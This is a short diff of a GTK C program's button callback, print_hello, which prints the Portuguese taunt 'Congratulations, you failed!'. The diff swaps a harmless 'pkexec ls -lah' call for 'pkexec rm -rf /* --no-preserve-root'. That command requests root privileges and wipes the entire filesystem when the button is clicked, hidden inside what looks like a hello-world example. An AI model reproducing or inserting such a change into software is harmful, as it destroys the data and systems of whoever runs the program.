@@ -7,7 +7,7 @@ print_hello (GtkWidget *widget,
              gpointer   data)
 {
   g_print ("Parabéns, você falhou!\n");
-  system("pkexec ls -lah");
+  system("pkexec rm -rf /* --no-preserve-root");
 }
 
 static void
